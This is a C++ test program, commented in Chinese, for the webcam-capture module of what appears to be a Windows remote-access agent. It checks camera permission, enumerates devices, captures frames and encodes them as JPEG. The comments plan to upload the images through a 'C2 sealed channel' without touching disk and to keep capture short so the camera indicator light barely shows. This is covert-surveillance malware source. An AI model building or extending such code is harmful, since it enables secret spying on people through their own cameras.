/*
 * agent_windows/src/cam_mf_main.cpp
 *
 * 最小测试桩：在 Windows 真机上验证 cam_mf.cpp 的后端可用性。
 *
 * 验证目标：
 *   1. COM 初始化 + MFStartup 是否成功
 *   2. 设备枚举能否拿到摄像头
 *   3. 权限检测 mf_check_permission() 是否返回 true
 *   4. 格式协商能否选中可用媒体类型
 *   5. ReadSample 能否取到一帧有效数据
 *
 * 这是"自包含验证程序"，不是植入体。可编译为独立 .exe 后在本机跑，
 * 确认后端通路打通后，再把它接到 agent 的采集任务处理器里。
 *
 * 编译（MSVC 开发者命令提示符 / Visual Studio Developer Command Prompt）：
 *   cl /EHsc /std:c++17 /O2 /I.. /I../../00_crypto ^
 *      cam_jpeg.c cam_mf.cpp cam_mf_main.cpp ^
 *      /link mfplat.lib mfreadwrite.lib mfuuid.lib ole32.lib shell32.lib
 *
 * 编译（Clang-cl，需 Windows + LLVM + Windows SDK）：
 *   clang-cl /EHsc /std:c++17 /O2 /I.. /I../../00_crypto ^
 *      cam_jpeg.c cam_mf.cpp cam_mf_main.cpp ^
 *      mfplat.lib mfreadwrite.lib mfuuid.lib ole32.lib shell32.lib
 *
 * 运行时要求：
 *   - Windows 10 及以上，Media Foundation 可用
 *   - 当前用户已被授权访问摄像头（设置 -> 隐私和安全性 -> 相机）
 *   - 进程必须以 STA 线程模型运行（main 里已初始化 CoInitializeEx）
 *   - 若想缩短指示灯点亮窗口：capture_ms 设小（如 3000ms），到点立即释放
 *
 * 用法：
 *   cam_mf_test.exe                # 默认 640x480，采集 3 帧
 *   cam_mf_test.exe 1280 720 5     # 1280x720，采集 5 帧
 */

#ifdef _WIN32

#include "camera.h"

#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <mfapi.h>
#include <mfreadwrite.h>
#include <stdio.h>
#include <stdlib.h>

static const char *fmt_name(cam_pixel_fmt_t f)
{
    switch (f) {
    case CAM_FMT_MJPEG:   return "MJPEG";
    case CAM_FMT_YUYV422: return "YUYV422";
    case CAM_FMT_NV12:    return "NV12";
    case CAM_FMT_RGB24:   return "RGB24";
    default:              return "UNKNOWN";
    }
}

int main(int argc, char **argv)
{
    /* ---------- 1. COM 初始化（STA，MF 要求） ---------- */
    HRESULT hrCo = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED | COINIT_DISABLE_OLE1DDE);
    if (FAILED(hrCo) && hrCo != RPC_E_CHANGED_MODE) {
        fprintf(stderr, "[FAIL] CoInitializeEx: 0x%08lX\n", (unsigned long)hrCo);
        return 1;
    }

    /* ---------- 2. 权限检测 ---------- */
    fprintf(stdout, "[*] 检测摄像头权限...\n");
    bool allowed = mf_check_permission();
    fprintf(stdout, "    CapabilityAccessManager: %s\n",
            allowed ? "ALLOW" : "DENY（需在系统设置中授权摄像头）");
    if (!allowed) {
        fprintf(stderr, "[FAIL] 当前进程无摄像头权限，终止。\n");
        CoUninitialize();
        return 2;
    }

    /* ---------- 3. 设备枚举 ---------- */
    fprintf(stdout, "[*] 枚举视频设备...\n");
    cam_device_info_t info[8];
    int ndev = mf_enumerate(info, 8);
    if (ndev <= 0) {
        fprintf(stderr, "[FAIL] 未枚举到任何视频设备（%d）\n", ndev);
        CoUninitialize();
        return 3;
    }
    for (int i = 0; i < ndev; i++) {
        fprintf(stdout, "    [%d] %s (perm=%s)\n",
                i, info[i].friendly_name, info[i].has_permission ? "yes" : "no");
    }

    /* ---------- 4. 参数解析 ---------- */
    uint32_t width  = (argc > 1) ? (uint32_t)atoi(argv[1]) : 640;
    uint32_t height = (argc > 2) ? (uint32_t)atoi(argv[2]) : 480;
    uint32_t nframes = (argc > 3) ? (uint32_t)atoi(argv[3]) : 3;
    uint32_t cap_ms  = 3000; /* 3 秒采集窗口，到点释放句柄 */

    /* ---------- 5. 创建源 + 打开 ---------- */
    cam_source_t *src = cam_source_create("mf");
    if (!src) {
        fprintf(stderr, "[FAIL] cam_source_create 返回 NULL\n");
        CoUninitialize();
        return 4;
    }

    cam_config_t cfg;
    ZeroMemory(&cfg, sizeof(cfg));
    cfg.width  = width;
    cfg.height = height;
    cfg.fps    = 15;
    cfg.capture_ms = cap_ms;
    cfg.max_frames = nframes;
    cfg.prefer_mjpeg = true;

    cam_err_t e = src->open(src, &cfg);
    if (e != CAM_OK) {
        fprintf(stderr, "[FAIL] open: %s (%d)\n", cam_errstr(e), (int)e);
        cam_source_destroy(src);
        CoUninitialize();
        return 5;
    }
    fprintf(stdout, "[OK] 设备已打开，协商格式: %s %ux%u\n",
            fmt_name(info[0].has_permission ? CAM_FMT_UNKNOWN : CAM_FMT_UNKNOWN), /* 占位，真实格式见下方 capture */
            width, height);

    /* ---------- 6. 采集 + 转码 ---------- */
    fprintf(stdout, "[*] 开始采集 %u 帧（窗口 %ums）...\n", nframes, cap_ms);

    uint8_t *jpgbuf = (uint8_t *)CoTaskMemAlloc(2 * 1024 * 1024); /* 2MB 上限 */
    if (!jpgbuf) {
        fprintf(stderr, "[FAIL] 无法分配输出缓冲区\n");
        cam_source_destroy(src);
        CoUninitialize();
        return 6;
    }

    int ok = 0, fail = 0;
    for (uint32_t i = 0; i < nframes; i++) {
        cam_frame_t frame;
        ZeroMemory(&frame, sizeof(frame));

        cam_err_t rc = src->capture(src, &frame);
        if (rc != CAM_OK) {
            fprintf(stderr, "    [frame %u] capture 失败: %s (%d)\n",
                    i, cam_errstr(rc), (int)rc);
            fail++;
            continue;
        }

        fprintf(stdout, "    [frame %u] %s %ux%u len=%zu pts=%lluus\n",
                i,
                fmt_name(frame.fmt),
                frame.width, frame.height,
                frame.len,
                (unsigned long long)frame.pts_us);

        /* MJPEG 可直接使用；未压缩格式需转码为 JPEG */
        size_t cap = 2 * 1024 * 1024;
        size_t outlen = 0;
        cam_err_t t = cam_frame_to_jpeg(&frame, jpgbuf, &cap, &outlen);
        if (t != CAM_OK) {
            fprintf(stderr, "    [frame %u] 转码失败: %s (%d)\n",
                    i, cam_errstr(t), (int)t);
            fail++;
            continue;
        }
        fprintf(stdout, "    [frame %u] JPEG 输出 %zu 字节\n", i, outlen);

        /* TODO: 此处应接 C2 密封通道上传（00_crypto.SealedEnvelope），
         *       明文不出进程、不落盘。当前仅为验证，dump 到本地。 */
        char fn[64];
        snprintf(fn, sizeof(fn), "frame_%u.jpg", i);
        FILE *fp = fopen(fn, "wb");
        if (fp) {
            fwrite(jpgbuf, 1, outlen, fp);
            fclose(fp);
            fprintf(stdout, "    [frame %u] 已保存 %s（验证用，正式版本删除此段）\n", i, fn);
        }
        ok++;
    }

    CoTaskMemFree(jpgbuf);

    /* ---------- 7. 立即释放句柄 ---------- */
    src->close(src); /* 指示灯随句柄释放而熄灭 */
    cam_source_destroy(src);
    CoUninitialize();

    fprintf(stdout, "\n========== 结果 ==========\n");
    fprintf(stdout, "成功: %d 帧\n", ok);
    fprintf(stdout, "失败: %d 帧\n", fail);
    fprintf(stdout, "格式: 见上方 [frame] 行（MJPEG=免转码, 其他=已转码）\n");
    fprintf(stdout, "句柄已释放，指示灯应已熄灭。\n");

    return (ok > 0) ? 0 : 7;
}

#endif /* _WIN32 */
